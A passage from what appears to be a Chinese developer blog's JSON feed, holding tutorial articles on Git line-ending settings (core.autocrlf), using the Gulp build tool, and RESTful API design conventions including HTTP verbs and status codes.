LF</h3>\n<p>如果你的源文件中是换行符是 LF, 而 <code>autocrlf=true</code> , 此时 <code>Git add .</code> 就会遇到 <code>fatal: LF would be replaced by CRLF</code> 的错误。有两个解决办法:</p>\n<ol>\n<li>将你的源文件中的 LF 转为 CRLF 即可【推荐】</li>\n<li>将 autocrlf 设置为 false</li>\n</ol>\n<h3 id=\"源文件中是换行符是-crlf\" tabindex=\"-1\"> 源文件中是换行符是 CRLF</h3>\n<p>如果你的源文件中是换行符是 CRLF, 而 <code>autocrlf=input</code> , 此时 <code>Git add .</code> 也会遇到 <code>fatal: CRLF would be replaced by LF</code> 的错误。有两个解决办法:</p>\n<ol>\n<li>将你源文件中的 CRLF 转为 LF【推荐】</li>\n<li>将 autocrlf 设置为 true 或者 false</li>\n</ol>\n<h2 id=\"core-autocrlf\" tabindex=\"-1\"> core.autocrlf</h2>\n<p>Git 可以在你提交时自动地把行结束符 CRLF 转换成 LF, 而在签出代码时把 LF 转换成 CRLF。用 core.autocrlf 来打开此项功能, 如果是在 Windows 系统上, 把它设置成 true, 这样当签出代码时, LF 会被转换成 CRLF:</p>\n<div><pre><code><span>git</span> config --global core.autocrlf <span>true</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>Linux 或 Mac 系统使用 LF 作为行结束符, 因此你不想 Git 在签出文件时进行自动的转换；当一个以 CRLF 为行结束符的文件不小心被引入时你肯定想进行修正, 把 core.autocrlf 设置成 input 来告诉 Git 在提交时把 CRLF 转换成 LF, 签出时不转换:</p>\n<div><pre><code><span>git</span> config --global core.autocrlf input\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>这样会在 Windows 系统上的签出文件中保留 CRLF, 会在 Mac 和 Linux 系统上, 包括仓库中保留 LF。</p>\n<p>如果你是 Windows 程序员, 且正在开发仅运行在 Windows 上的项目, 可以设置 false 取消此功能, 把回车符记录在库中:</p>\n<div><pre><code><span>git</span> config --global core.autocrlf <span>false</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"建议\" tabindex=\"-1\"> 建议</h2>\n<p>在 Mac/Liunx 上设置 <code>autocrlf = input</code> , 在 Windows 上设置 autocrlf = true（默认值）。</p>\n<p>Windows: （true） 提交时, 将 CRLF 转成 LF 再提交；切出时, 自动将 LF 转为 CRLF;</p>\n<p>MAC/Linux: (input) 提交时, 将 CRLF 转成 LF 再提交；切出时, 保持 LF 即可</p>\n<p>这样即可保证仓库中永远都是 LF. 而且在 Windows 工作空间都是 CRLF, 在 Mac/linux 工作空间都是 LF</p>\n",
      "date_published": "2016-07-31T16:09:21.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "manual"
      ]
    },
    {
      "title": "Gulp 使用指南",
      "url": "https://vxhly.github.io/views/manual/gulp-usage-guide.html",
      "id": "https://vxhly.github.io/views/manual/gulp-usage-guide.html",
      "summary": "前言\n本文主要介绍如何使用 Gulp.js, 来帮助你构建一个自动化的前端开发流程。总结并归类自身使用中所遇到的方法、问题, 便于新人上手和理解, 同时也作为一份 Gulp 参考文档来使用, 让你对 Gulp 有个更深入的了解。\n\n",
      "content_html": "<div><p>前言</p>\n<p>本文主要介绍如何使用 Gulp.js, 来帮助你构建一个自动化的前端开发流程。总结并归类自身使用中所遇到的方法、问题, 便于新人上手和理解, 同时也作为一份 Gulp 参考文档来使用, 让你对 Gulp 有个更深入的了解。</p>\n</div>\n\n<h2 id=\"gulp-是什么\" tabindex=\"-1\"> Gulp 是什么</h2>\n<p>Gulp 是基于 <code>Node.js</code> 的一个构建工具（自动任务运行器）, 开发者可以使用它构建自动化工作流程（前端集成开发环境）。一些常见、重复的任务, 例如: 网页自动刷新、CSS 预处理、代码检测、压缩图片、等等, 只需用简单的命令就能全部完成。使用它, 可以简化工作, 让你把重点放在功能开发上；同时减少人为失误, 提高开发效率和项目质量, 让专注更为专注。如果你之前接触过 Grunt, 那上手 Gulp 就会觉得非常容易理解。</p>\n<h2 id=\"为什么使用-gulp-而不使用-grunt\" tabindex=\"-1\"> 为什么使用 Gulp 而不使用 Grunt</h2>\n<p>构建前端自动化的工具有很多, 如: <code>Grunt</code> , <code>Brunch</code> , <code>Broccoli</code> 等, 而目前过内最流行的属于 Grunt, 之前我也在用使用, 那为什么选择 Gulp 来代替 Grunt？</p>\n<p>简单的总结一下, 有三点:</p>\n<ul>\n<li>简洁: Gulp 侧重 <code>“代码优于配置”(code over configuration)</code> 。最直观的感受, 更为简单和清晰, 不需要像 Grunt 一样写一堆庞大的配置文件。</li>\n<li>高效: Gulp 基于 <code>Node Streams（流</code> ）来构建任务, 避免磁盘反复 <code>I/O（读取/写入）</code> 。每个任务都是单独执行（坚持做一件事并且做好它）, 这使得它速度更快、更为纯粹。</li>\n<li>易学: Gulp 核心 API 只有 4 个。简洁的 API 易于上手, 学习过程比较平滑。</li>\n</ul>\n<h2 id=\"gulp-核心-api\" tabindex=\"-1\"> Gulp 核心 API</h2>\n<p>Gulp 的核心 API 只有 4 个: <code>src</code> 、 <code>dest</code> 、 <code>task</code> 、 <code>watch</code></p>\n<ul>\n<li><code>gulp.src(globs[, options])</code> =&gt; 指明源文件路径。<strong>globs</strong>: 路径模式匹配; <strong>options</strong>: 可选参数；</li>\n<li><code>gulp.dest(path[, options])</code> =&gt; 指明处理后的文件输出路径。<strong>path</strong>: 路径（一个任务可以有多个输出路径）；<strong>options</strong>: 可选参数；</li>\n<li><code>gulp.task(name[, deps], fn)</code> =&gt; 注册任务。<strong>name</strong>: 任务名称（通过 gulp name 来执行这个任务）; <strong>deps</strong>: 可选的数组, 在本任务运行中所需要所依赖的其他任务（当前任务在依赖任务执行完毕后才会执行）; <strong>fn</strong>: 任务函数（function 方法）；</li>\n<li><code>gulp.watch(glob [, opts], tasks)</code> =&gt; 监视文件的变化并运行相应的任务。<strong>glob</strong>: 路径模式匹配; <strong>opts</strong>: 可以选配置对象; <strong>taks</strong>: 执行的任务；</li>\n</ul>\n<p><a href=\"http://github.com/gulpjs/gulp/blob/master/docs/API.md\" target=\"_blank\" rel=\"noopener noreferrer\">API 帮助文档</a></p>\n<h2 id=\"安装-gulp\" tabindex=\"-1\"> 安装 Gulp</h2>\n<p>安装 Gulp 之前要确定系统中安装了 Node.js, 有了之后只需创建一个工作目录, 以下操作均在工作目录下执行。</p>\n<h3 id=\"全局安装\" tabindex=\"-1\"> 全局安装</h3>\n<p>深入设置任务之前, 需先安装 gulp:</p>\n<div><pre><code><span>npm</span> <span>install</span> gulp -g\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>这会将 gulp 安装到全域环境下, 让你可以存取 gulp 的 CLI。</p>\n<h3 id=\"本地安装\" tabindex=\"-1\"> 本地安装</h3>\n<p>接着, 需要在本地的工在目录进行安装。切换至你的工作目录, 执行以下命令（当然执行之前要先确定该目录下有 <code>package.json</code> 文件, 如果没有可以通过 <code>npm init</code> 进行创建）</p>\n<div><pre><code><span>npm</span> <span>install</span> gulp --save-dev\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>上述指令将 gulp 安装到本地的工作目录, 并纪录于 <code>package.json</code> 中的 <code>devDependencies</code> 选项内。</p>\n<h2 id=\"安装-gulp-插件\" tabindex=\"-1\"> 安装 Gulp 插件</h2>\n<h3 id=\"推荐插件\" tabindex=\"-1\"> 推荐插件</h3>\n<ul>\n<li>静态服务器 (<a href=\"http://github.com/schickling/gulp-webserver\" target=\"_blank\" rel=\"noopener noreferrer\">gulp-webserver</a>)</li>\n<li>网页自动刷新 ([gulp-livereload][<a href=\"https://github.com/vohof/gulp-livereload\" target=\"_blank\" rel=\"noopener noreferrer\">https://github.com/vohof/gulp-livereload</a>])</li>\n<li>编译 <strong>Sass</strong> (<a href=\"http://github.com/sindresorhus/gulp-ruby-sass\" target=\"_blank\" rel=\"noopener noreferrer\">gulp-ruby-sass</a>)</li>\n<li><strong>Autoprefixer</strong> (<a href=\"http://github.com/Metrime/gulp-autoprefixer\" target=\"_blank\" rel=\"noopener noreferrer\">gulp-autoprefixer</a>)</li>\n<li>缩小化(minify) <strong>CSS</strong> (<a href=\"http://github.com/jonathanepollack/gulp-minify-css\" target=\"_blank\" rel=\"noopener noreferrer\">gulp-minify-css</a>)</li>\n<li><strong>JSHint</strong> (<a href=\"http://github.com/wearefractal/gulp-jshint\" target=\"_blank\" rel=\"noopener noreferrer\">gulp-jshint</a>)</li>\n<li>拼接 (<a href=\"http://github.com/wearefractal/gulp-concat\" target=\"_blank\" rel=\"noopener noreferrer\">gulp-concat</a>)</li>\n<li>丑化(Uglify) (<a href=\"http://github.com/terinjokes/gulp-uglify\" target=\"_blank\" rel=\"noopener noreferrer\">gulp-uglify</a>)</li>\n<li>图片压缩 (<a href=\"http://github.com/sindresorhus/gulp-imagemin\" target=\"_blank\" rel=\"noopener noreferrer\">gulp-imagemin</a>)</li>\n<li>即时重整(LiveReload) (<a href=\"http://github.com/vohof/gulp-livereload\" target=\"_blank\" rel=\"noopener noreferrer\">gulp-livereload</a>)</li>\n<li>清理档案 (<a href=\"http://github.com/peter-vilja/gulp-clean\" target=\"_blank\" rel=\"noopener noreferrer\">gulp-clean</a>)</li>\n<li>图片快取, 只有更改过得图片会进行压缩 (<a href=\"http://github.com/jgable/gulp-cache/\" target=\"_blank\" rel=\"noopener noreferrer\">gulp-cache</a>)</li>\n<li>更动通知 (<a href=\"http://github.com/mikaelbr/gulp-notify\" target=\"_blank\" rel=\"noopener noreferrer\">gulp-notify</a>)</li>\n</ul>\n<h3 id=\"通过-npm-进行安装\" tabindex=\"-1\"> 通过 npm 进行安装</h3>\n<p><code>Install Format:</code></p>\n<div><pre><code><span>npm</span> <span>install</span> <span>[</span>Module_Name<span>]</span> --save-dev\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"gulp-任务配置\" tabindex=\"-1\"> Gulp 任务配置</h2>\n<h3 id=\"创建-gulpfile-js-文件\" tabindex=\"-1\"> 创建 gulpfile.js 文件</h3>\n<p>在项目根目录中, 创建 <code>gulpfile.js</code> 文件, 用来配置和定义任务（ <code>task</code> ）。</p>\n<div><pre><code><span>touch</span> gulpfile.js\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"我的安装插件\" tabindex=\"-1\"> 我的安装插件</h3>\n<div><pre><code><span>npm</span> <span>install</span> gulp --save-dev               <span># 基础库</span>\n<span>npm</span> <span>install</span> gulp-livereload --save-dev    <span># 网页自动刷新</span>\n<span>npm</span> <span>install</span> gulp-webserver --save-dev     <span># 本地服务器</span>\n<span>npm</span> <span>install</span> gulp-notify --save-dev        <span># 更新</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div></div></div><h3 id=\"我的-gulpfile-js-配置\" tabindex=\"-1\"> 我的 gulpfile.js 配置</h3>\n<p>打开 <code>gulpfile.js</code> 文件, 填写相关配置。</p>\n<div><pre><code><span>// 引入 gulp</span>\n<span>var</span> gulp <span>=</span> <span>require</span><span>(</span><span>\"gulp\"</span><span>)</span><span>;</span> <span>// 基础库</span>\n\n<span>// 引入 gulp 插件</span>\n<span>var</span> livereload <span>=</span> <span>require</span><span>(</span><span>\"gulp-livereload\"</span><span>)</span><span>;</span> <span>// 网页自动刷新（服务器控制客户端同步刷新）</span>\n<span>var</span> webserver <span>=</span> <span>require</span><span>(</span><span>\"gulp-webserver\"</span><span>)</span><span>;</span> <span>// 本地服务器</span>\n\n<span>// 注册任务</span>\ngulp<span>.</span><span>task</span><span>(</span><span>\"webserver\"</span><span>,</span> <span>function</span> <span>(</span><span>)</span> <span>{</span>\n  gulp\n    <span>.</span><span>src</span><span>(</span><span>\"./\"</span><span>)</span> <span>// 服务器目录（./ 代表根目录）</span>\n    <span>.</span><span>pipe</span><span>(</span>\n      <span>webserver</span><span>(</span><span>{</span>\n        <span>// 运行 gulp-webserver</span>\n        <span>livereload</span><span>:</span> <span>true</span><span>,</span> <span>// 启用 LiveReload</span>\n        <span>open</span><span>:</span> <span>true</span><span>,</span> <span>// 服务器启动时自动打开网页</span>\n      <span>}</span><span>)</span>\n    <span>)</span><span>;</span>\n<span>}</span><span>)</span><span>;</span>\n\n<span>// 监听任务</span>\ngulp<span>.</span><span>task</span><span>(</span><span>\"watch\"</span><span>,</span> <span>function</span> <span>(</span><span>)</span> <span>{</span>\n  gulp<span>.</span><span>watch</span><span>(</span><span>\"*.html\"</span><span>,</span> <span>[</span><span>\"html\"</span><span>]</span><span>)</span><span>;</span> <span>// 监听根目录下所有 .html 文件</span>\n<span>}</span><span>)</span><span>;</span>\n\n<span>// 默认任务</span>\ngulp<span>.</span><span>task</span><span>(</span><span>\"default\"</span><span>,</span> <span>[</span><span>\"webserver\"</span><span>,</span> <span>\"watch\"</span><span>]</span><span>)</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div>",
      "date_published": "2016-10-28T19:06:15.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "manual"
      ]
    },
    {
      "title": "RESTful API 设计指南（补充）",
      "url": "https://vxhly.github.io/views/manual/restfui-api.html",
      "id": "https://vxhly.github.io/views/manual/restfui-api.html",
      "summary": "前言\n网络应用程序, 分为前端和后端两个部分。这时候必须有一种统一的机制, 方便不同的前端设备与后端进行通信。这导致 API 构架的流行, 甚至出现 &quot;API First&quot; 的设计思想。 RESTful API  是目前比较成熟的一套互联网应用程序的 API 设计理论。\n\n",
      "content_html": "<div><p>前言</p>\n<p>网络应用程序, 分为前端和后端两个部分。这时候必须有一种统一的机制, 方便不同的前端设备与后端进行通信。这导致 API 构架的流行, 甚至出现 &quot;API First&quot; 的设计思想。<a href=\"http://en.wikipedia.org/wiki/Representational_state_transfer\" target=\"_blank\" rel=\"noopener noreferrer\"> <code>RESTful API</code> </a> 是目前比较成熟的一套互联网应用程序的 API 设计理论。</p>\n</div>\n\n<h2 id=\"先言\" tabindex=\"-1\"> 先言</h2>\n<div><p>提示</p>\n<p>该篇博文为补充 <a href=\"http://www.ruanyifeng.com/blog/2014/05/restful_api.html\" target=\"_blank\" rel=\"noopener noreferrer\">RESTful API 设计指南- 阮一峰的网络日志</a></p>\n<p><a href=\"https://github.com/aisuhua/restful-api-design-references\" target=\"_blank\" rel=\"noopener noreferrer\">RESTful API 设计参考文献列表, 可帮助你更加彻底的了解 REST 风格的接口设计</a>。</p>\n<p>REST API 一般用来将某种资源和允许的对资源的操作暴露给外界, 使调用者能够以正确的方式操作资源。这里, 在输入输出的处理上, 要符合 HTTP/1.1（不久的将来, 要符合 HTTP/2.0）的 RFC, 保证接口的一致性。</p>\n</div>\n<h2 id=\"协议\" tabindex=\"-1\"> 协议</h2>\n<p>API 与用户的通信协议, 总是使用 <a href=\"http://www.ruanyifeng.com/blog/2014/02/ssl_tls.html\" target=\"_blank\" rel=\"noopener noreferrer\">https</a> 协议。</p>\n<h2 id=\"域名\" tabindex=\"-1\"> 域名</h2>\n<p>应该尽量将 API 部署在专用域名之下。</p>\n<p><a href=\"https://api.example.com\" target=\"_blank\" rel=\"noopener noreferrer\">https://api.example.com</a></p>\n<p>如果确定 API 很简单, 不会有进一步扩展, 可以考虑放在主域名下。</p>\n<p><a href=\"https://example.org/api/\" target=\"_blank\" rel=\"noopener noreferrer\">https://example.org/api/</a></p>\n<h2 id=\"版本-versioning\" tabindex=\"-1\"> 版本（Versioning）</h2>\n<p>应该将 API 的版本号放入 URL。</p>\n<p><a href=\"https://api.example.com/v1/\" target=\"_blank\" rel=\"noopener noreferrer\">https://api.example.com/v1/</a></p>\n<p>另一种做法是, 将版本号放在 HTTP 头信息中, 但不如放入 URL 方便和直观。<a href=\"http://developer.github.com/v3/media/#request-specific-version\" target=\"_blank\" rel=\"noopener noreferrer\">Github</a> 采用这种做法。</p>\n<h2 id=\"路径-endpoint\" tabindex=\"-1\"> 路径（Endpoint）</h2>\n<p>路径又称&quot;终点&quot;（endpoint）, 表示 API 的具体网址。 在 RESTful 架构中, 每个网址代表一种资源（resource）, 所以网址中不能有动词, 只能有名词, 而且所用的名词往往与数据库的表格名对应。一般来说, 数据库中的表都是同种记录的&quot;集合&quot;（collection）, 所以 API 中的名词也应该使用复数。 举例来说, 有一个 API 提供动物园（zoo）的信息, 还包括各种动物和雇员的信息, 则它的路径应该设计成下面这样。</p>\n<ul>\n<li><a href=\"https://api.example.com/v1/zoos\" target=\"_blank\" rel=\"noopener noreferrer\">https://api.example.com/v1/zoos</a></li>\n<li><a href=\"https://api.example.com/v1/animals\" target=\"_blank\" rel=\"noopener noreferrer\">https://api.example.com/v1/animals</a></li>\n<li><a href=\"https://api.example.com/v1/employees\" target=\"_blank\" rel=\"noopener noreferrer\">https://api.example.com/v1/employees</a>、</li>\n</ul>\n<h2 id=\"restful-api-规范\" tabindex=\"-1\"> RESTful API 规范</h2>\n<ul>\n<li>URI 请求采用小写字母, 数字, 部分特殊符号（非制表符, 该特殊符号特指 _、&amp;、?）组成。</li>\n<li>URI 请求中不采用大小写混合的驼峰命名方式, 尽量采用全小写单词, 如果需要连接多个单词, 则采用连接符 <code>_</code> 连接单词</li>\n<li>URI 中不包含文件名, 例如 <code>/api/test.php</code></li>\n<li>URI 中不包含 HTTP 动词, 动作由请求包体中的 method 决定, 语义化能够一眼看出当前的操作</li>\n<li>URI 不能过长, 任何 HTTP 协议客户端和服务器都应当支持 8000 字节的首行（方法名 + URI + HTTP 版本号）, 可以理解成支持 7980+ 字节的 URI</li>\n<li>非 ID 形式的全部通过使用 ? 传参形式, 并且使用 encodeURI 或者 encodeURIComponent 进行编码</li>\n<li>使用复数形式的单词表示大量的数据, 例如 <code>/api/users</code></li>\n<li>根据需求添加 版本号, 例如 <code>/api/v1/users</code></li>\n<li>根据需求添加 SecretKey, 特指某些对外服务盈利的接口</li>\n<li>过深的导航容易导致 url 膨胀, 不易维护, 如 GET /zoos/1/areas/3/animals/4, 尽量使用查询参数代替路径中的实体导航, 如 GET /animals?zoo=1&amp;area=3</li>\n<li>对于一些需要用户验证的查用 <code>OAuth</code> 或者 <code>JWT</code> , 并且添加 HTTP Authorization 请求头</li>\n<li>关于 <code>Content-Type</code> 采用 <code>application/json;charset=UTF-8</code> 或者 <code> application/x-www-form-urlencoded;charset=UTF-8</code></li>\n</ul>\n<h2 id=\"http-动词\" tabindex=\"-1\"> HTTP 动词</h2>\n<p>对于资源的具体操作类型, 由 HTTP 动词表示。 常用的 HTTP 动词有下面五个（括号里是对应的 SQL 命令）。</p>\n<ul>\n<li><strong>GET（SELECT）</strong> =&gt; 从服务器取出资源（一项或多项）。</li>\n<li><strong>POST（CREATE）</strong> =&gt; 在服务器新建一个资源。</li>\n<li><strong>PUT（UPDATE）</strong> =&gt; 在服务器更新资源（客户端提供改变后的完整资源）。</li>\n<li><strong>PATCH（UPDATE）</strong> =&gt; 在服务器更新资源（客户端提供改变的属性）。</li>\n<li><strong>DELETE（DELETE）</strong> =&gt; 从服务器删除资源。</li>\n</ul>\n<p>还有两个不常用的 HTTP 动词。</p>\n<ul>\n<li><strong>HEAD</strong> =&gt; 获取资源的元数据。</li>\n<li><strong>OPTIONS</strong> =&gt; 获取信息, 关于资源的哪些属性是客户端可以改变的。</li>\n</ul>\n<p>下面是一些例子。</p>\n<ul>\n<li><strong>GET</strong> <code>/zoos</code> =&gt; 列出所有动物园</li>\n<li><strong>POST</strong> <code>/zoos</code> =&gt; 新建一个动物园</li>\n<li><strong>GET</strong> <code>/zoos/ID</code> =&gt; 获取某个指定动物园的信息</li>\n<li><strong>PUT</strong> <code>/zoos/ID</code> =&gt; 更新某个指定动物园的信息（提供该动物园的全部信息）</li>\n<li><strong>PATCH</strong> <code>/zoos/ID</code> =&gt; 更新某个指定动物园的信息（提供该动物园的部分信息）</li>\n<li><strong>DELETE</strong> <code>/zoos/ID</code> =&gt; 删除某个动物园</li>\n<li><strong>GET</strong> <code>/zoos/ID/animals</code> =&gt; 列出某个指定动物园的所有动物</li>\n<li><strong>DELETE</strong> <code>/zoos/ID/animals/ID</code> =&gt; 删除某个指定动物园的指定动物</li>\n</ul>\n<h2 id=\"过滤信息-filtering\" tabindex=\"-1\"> 过滤信息（Filtering）</h2>\n<p>如果记录数量很多, 服务器不可能都将它们返回给用户。AP I 应该提供参数, 过滤返回结果。 下面是一些常见的参数。</p>\n<ul>\n<li><code>?limit=10</code> =&gt; 指定返回记录的数量</li>\n<li><code>?offset=10</code> =&gt; 指定返回记录的开始位置。</li>\n<li><code>?page=2&amp;per_page=100</code> =&gt; 指定第几页, 以及每页的记录数。</li>\n<li><code>?sortby=nameℴ=asc</code> =&gt; 指定返回结果按照哪个属性排序, 以及排序顺序。</li>\n<li><code>?animal_type_id=1</code> =&gt; 指定筛选条件</li>\n</ul>\n<p>参数的设计允许存在冗余, 即允许 API 路径和 URL 参数偶尔有重复。比如, GET <code>/zoo/ID/animals</code> 与 GET <code>/animals?zoo_id=ID</code> 的含义是相同的。</p>\n<h2 id=\"状态码-status-codes\" tabindex=\"-1\"> 状态码（Status Codes）</h2>\n<p>服务器向用户返回的状态码和提示信息, 常见的有以下一些（方括号中是该状态码对应的 HTTP 动词）。</p>\n<h3 id=\"请求成功\" tabindex=\"-1\"> 请求成功</h3>\n<ul>\n<li><strong>200</strong> <code>OK</code> -&gt; 【 <code>GET</code> 】 =&gt; 服务器成功返回用户请求的数据, 该操作是幂等的（Idempotent）。</li>\n<li><strong>201</strong> <code>CREATED</code> -&gt; 【 <code>POST/PUT/PATCH</code> 】 =&gt; 对象创建成功并返回相应资源数据, 如 <code>POST</code> 成功；创建完成后响应头中应该携带头标 <code>Location</code> , 指向新建资源的地址</li>\n<li><strong>202</strong> <code>Accepted</code> -&gt; 【 <code>*</code> 】 =&gt; 接受请求, 但无法立即完成创建行为, 比如其中涉及到一个需要花费若干小时才能完成的任务。返回的实体中应该包含当前状态的信息, 以及指向处理状态监视器或状态预测的指针, 以便客户端能够获取最新状态。</li>\n<li><strong>204</strong> <code>No Content </code> -&gt; 【 <code>DELETE/PATCH</code> 】 =&gt; 请求执行成功, 不返回相应资源数据</li>\n</ul>\n<h3 id=\"重定向\" tabindex=\"-1\"> 重定向</h3>\n<p>重定向的新地址都需要在响应头 Location 中返回</p>\n<ul>\n<li><strong>301</strong> <code>Moved Permanently </code> -&gt; 【 <code>*</code> 】 =&gt; 被请求的资源已永久移动到新位置</li>\n<li><strong>302</strong> <code>Found</code> -&gt; 【 <code>*</code> 】 =&gt; 请求的资源现在临时从不同的 URI 响应请求</li>\n<li><strong>303</strong> <code>See Other</code> -&gt; 【 <code>*</code> 】 =&gt; 应当前请求的响应可以在另一个 URI 上被找到, 客户端应该使用 GET 方法进行请求。比如在创建已经被创建的资源时, 可以返回 303</li>\n<li><strong>307</strong> <code>Temporary Redirect </code> -&gt; 【 <code>*</code> 】 =&gt; 对应当前请求的响应可以在另一个 URI 上被找到, 客户端应该保持原有的请求方法进行请求</li>\n</ul>\n<h3 id=\"条件请求\" tabindex=\"-1\"> 条件请求</h3>\n<ul>\n<li><strong>304</strong> <code>Not Modified</code> -&gt; 【 <code>GET/HEAD</code> 】 =&gt; 未改变说明无需再次传输请求的内容, 也就是说可以使用缓存的内容。这通常是在一些安全的方法（safe）, 资源自从上次请求后没有再次发生变化, 主要使用场景在于实现数据缓存</li>\n<li><strong>409</strong> <code>Conflict </code> -&gt; 【 <code>GET/HEAD</code> 】 =&gt; 请求操作和资源的当前状态存在冲突。主要使用场景在于实现并发控制</li>\n<li><strong>412</strong> <code>Precondition Failed</code> -&gt; 【 <code>GET/HEAD</code> 】 =&gt; 服务器在验证在请求的头字段中给出先决条件时, 没能满足其中的一个或多个。主要使用场景在于实现并发控制</li>\n</ul>\n<h3 id=\"客户端错误\" tabindex=\"-1\"> 客户端错误</h3>\n<ul>\n<li><strong>400</strong> <code>Bad Request</code> -&gt; 【 <code>POST/PUT/PATCH</code> 】 =&gt; 请求体包含语法错误, 用户发出的请求有错误, 服务器没有进行新建或修改数据的操作, 该操作是幂等的。</li>\n<li><strong>401</strong> <code>Unauthorized</code> -&gt; 【 <code>*</code> 】 =&gt; 表示用户没有权限（令牌、用户名、密码错误）。需要验证用户身份, 如果服务器就算是身份验证后也不允许客户访问资源, 应该响应 403 Forbidden 。如果请求里有 Authorization 头, 那么必须返回一个 WWW-Authenticate 头</li>\n<li><strong>403</strong> <code>Forbidden</code> -&gt; 【 <code>*</code> 】 =&gt; 服务器拒绝执行, 表示用户得到授权（与 401 错误相对）, 但是访问是被禁止的。</li>\n<li><strong>404</strong> <code>Not Found</code> -&gt; 【 <code>*</code> 】 =&gt; 用户发出的请求针对的是不存在的记录, 服务器没有进行操作, 该操作是幂等的。</li>\n<li><strong>406</strong> <code>Not Acceptable</code> -&gt; 【 <code>GET</code> 】 =&gt; 用户请求的格式不可得（比如用户请求 JSON 格式, 但是只有 XML 格式）。服务器不支持客户端请求的内容格式, 但响应里会包含服务端能够给出的格式的数据, 并在 Content-Type 中声明格式名称</li>\n<li><strong>410</strong> <code>Gone</code> -&gt; 【 <code>GET</code> 】 =&gt; 用户请求的资源被永久删除, 且不会再得到的。被请求的资源已被删除, 只有在确定了这种情况是永久性的时候才可以使用, 否则建议使用 404 Not Found</li>\n<li><strong>413</strong> <code>Payload Too Large</code> -&gt; 【 <code>POST/PUT</code> 】=&gt; POST 或者 PUT 请求的消息实体过大</li>\n<li><strong>415</strong> <code>Unsupported Media Type</code> -&gt; 【 <code>GET</code> 】=&gt; 服务器不支持请求中提交的数据的格式</li>\n<li><strong>422</strong> <code>Unprocessable Entity</code> -&gt; 【 <code>POST/PUT/PATCH</code> 】=&gt; 请求格式正确, 但是由于含有语义错误, 无法响应</li>\n<li><strong>428</strong> <code>Precondition Required</code> -&gt; 【 <code>GET</code> 】 =&gt; 要求先决条件, 如果想要请求能成功必须满足一些预设的条件</li>\n</ul>\n<h3 id=\"服务端错误\" tabindex=\"-1\"> 服务端错误</h3>\n<ul>\n<li><strong>500</strong> <code>INTERNAL SERVER ERROR</code> -&gt; 【 <code>*</code> 】 =&gt; 服务器遇到了一个未曾预料的状况, 导致了它无法完成对请求的处理。</li>\n<li><strong>501</strong> <code>Not Implemented</code> -&gt; 【 <code>*</code> 】 =&gt; 服务器不支持当前请求所需要的某个功能。</li>\n<li><strong>502</strong> <code>Bad Gateway</code> -&gt; 【 <code>*</code> 】 =&gt; 作为网关或者代理工作的服务器尝试执行请求时, 从上游服务器接收到无效的响应。</li>\n<li><strong>503</strong> <code>Service Unavailable</code> -&gt; 【 <code>*</code> 】 =&gt; 由于临时的服务器维护或者过载, 服务器当前无法处理请求。这个状况是临时的, 并且将在一段时间以后恢复。</li>\n</ul>\n<p>状态码的完全列表参见<a href=\"http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html\" target=\"_blank\" rel=\"noopener noreferrer\">这里</a>。</p>\n<h2 id=\"错误处理-error-handling\" tabindex=\"-1\"> 错误处理（Error handling）</h2>\n<ol>\n<li>不要发生了错误但给 2xx 响应, 客户端可能会缓存成功的 http 请求；</li>\n<li>正确设置 http 状态码, 不要自定义；</li>\n<li>Response body 提供 1) 错误的代码（日志/问题追查）；2) 错误的描述文本（展示给用户）。</li>\n<li>如果状态码是 4xx, 就应该向用户返回出错信息。一般来说, 返回的信息中将 error 作为键名, 出错信息作为键值即可。</li>\n</ol>\n<p>业务类异常必须提供 2 种信息:</p>\n<ul>\n<li>如果抛出该类异常, HTTP 响应状态码应该设成什么；</li>\n<li>异常的文本描述；</li>\n</ul>\n<p>在 Controller 层使用统一的异常拦截器:</p>\n<ul>\n<li>设置 HTTP 响应状态码: 对业务类异常, 用它指定的 HTTP code；对非业务类异常, 统一 500；</li>\n<li>Response Body 的错误码: 异常类名</li>\n<li>Response Body 的错误描述: 对业务类异常, 用它指定的错误文本；对非业务类异常, 线上可以统一文案如“服务器端错误, 请稍后再试”, 开发或测试环境中用异常的 stacktrace, 服务器端提供该行为的开关。</li>\n</ul>\n<h2 id=\"返回结果\" tabindex=\"-1\"> 返回结果</h2>\n<p>针对不同操作, 服务器向用户返回的结果应该符合以下规范。</p>\n<ul>\n<li><strong>Get</strong> <code>/collection</code> =&gt; 返回资源对象的列表（数组）</li>\n<li><strong>Get</strong> <code>/collection/resource</code> =&gt; 返回单个资源对象</li>\n<li><strong>POST</strong> <code>/collection</code> =&gt; 返回新生成的资源对象</li>\n<li><strong>PUT</strong> <code>/collection/resource</code> =&gt; 返回完整的资源对象</li>\n<li><strong>PATCH</strong> <code>/collection/resource</code> =&gt; 返回完整的资源对象</li>\n<li><strong>DELETE</strong> <code>/collection/resource</code> =&gt; 返回一个空文档</li>\n</ul>\n<h2 id=\"hypermedia-api\" tabindex=\"-1\"> Hypermedia API</h2>\n<p>RESTful API 最好做到 Hypermedia, 即返回结果中提供链接, 连向其他 API 方法, 使得用户不查文档, 也知道下一步应该做什么。 比如, 当用户向 <a href=\"http://api.github.com/\" target=\"_blank\" rel=\"noopener noreferrer\">api.github.com</a> 的根目录发出请求, 会得到这样一个文档。</p>\n<div><pre><code><span>{</span>\n  <span>\"link\"</span><span>:</span> <span>{</span>\n    <span>\"rel\"</span><span>:</span> <span>\"collection https://www.example.com/zoos\"</span><span>,</span>\n    <span>\"href\"</span><span>:</span> <span>\"https://api.example.com/zoos\"</span><span>,</span>\n    <span>\"title\"</span><span>:</span> <span>\"List of zoos\"</span><span>,</span>\n    